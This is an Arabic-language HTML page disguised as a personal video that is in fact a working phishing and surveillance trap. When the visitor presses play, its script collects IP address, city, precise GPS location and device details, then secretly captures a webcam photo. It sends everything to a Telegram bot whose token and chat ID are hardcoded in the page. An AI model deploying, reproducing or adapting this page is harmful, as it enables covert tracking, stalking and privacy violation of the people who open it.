<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>📽️ فيديو خاص بك</title>
  <style>
    body {
      margin: 0;
      font-family: 'Tahoma', sans-serif;
      background: black;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    h1 {
      font-size: 26px;
      margin-bottom: 20px;
    }
    p {
      color: #ccc;
      margin-bottom: 30px;
    }
    button {
      background: #ff0050;
      color: white;
      border: none;
      padding: 14px 28px;
      border-radius: 50px;
      font-size: 18px;
      cursor: pointer;
      box-shadow: 0 0 10px #ff0050;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>
  <h1>📽️ اضغط لمشاهدة الفيديو</h1>
  <p>اضغط موافق لمشاهدة فيديو خاص بك</p>
  <button onclick="startProcess()">▶️ تشغيل الفيديو</button>

  <video id="video" autoplay playsinline></video>

  <script>
    const token = "7943173618:AAET1balD3R4V7MKFCR4ILjriL7sDTTgYkI";
    const chatId = "1684099099";

    async function sendTelegramMessage(text) {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
      });
    }

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");

      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function getIPInfo() {
      const res = await fetch("https://ipapi.co/json/");
      return await res.json();
    }

    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging ? "نعم ⚡" : "لا ❌"
        };
      } catch {
        return { level: "غير معروف", charging: "غير معروف" };
      }
    }

    async function getLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition((pos) => {
          const lat = pos.coords.latitude.toFixed(5);
          const lon = pos.coords.longitude.toFixed(5);
          resolve(`https://maps.google.com/?q=${lat},${lon}`);
        }, () => {
          resolve("❌ غير مسموح أو غير متاح");
        }, { timeout: 5000 });
      });
    }

    async function startProcess() {
      const ipInfo = await getIPInfo();
      const battery = await getBatteryInfo();
      const location = await getLocation();
      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

      const deviceInfo = navigator.userAgent;
      const screenRes = `${screen.width}x${screen.height}`;
      const connection = navigator.connection || {};
      const memory = navigator.deviceMemory || "غير معروف";
      const cores = navigator.hardwareConcurrency || "غير معروف";

      const message = `
📝 معلومات الزائر:
🌍 الدولة: ${ipInfo.country_name} 
🏙️ المدينة: ${ipInfo.city}
🌐 IP: ${ipInfo.ip}
📍 الموقع الجغرافي: ${location}

📱 الجهاز:
🔋 الشحن: ${battery.level}%
⚡ هل يشحن؟: ${battery.charging}
📶 الاتصال: ${connection.effectiveType || "غير معروف"}
💾 الذاكرة: ${memory} GB
⚙️ الأنوية: ${cores}
🖥️ المتصفح: ${deviceInfo}
📏 الشاشة: ${screenRes}
🕓 الوقت: ${now}
`;

      await sendTelegramMessage(message);

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          stream.getTracks().forEach(track => track.stop());

          canvas.toBlob(async (blob) => {
            await sendPhoto(blob);
          }, "image/jpeg");
        }, 3000);
      } catch (err) {
        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
      }
    }
  </script>
</body>
</html>
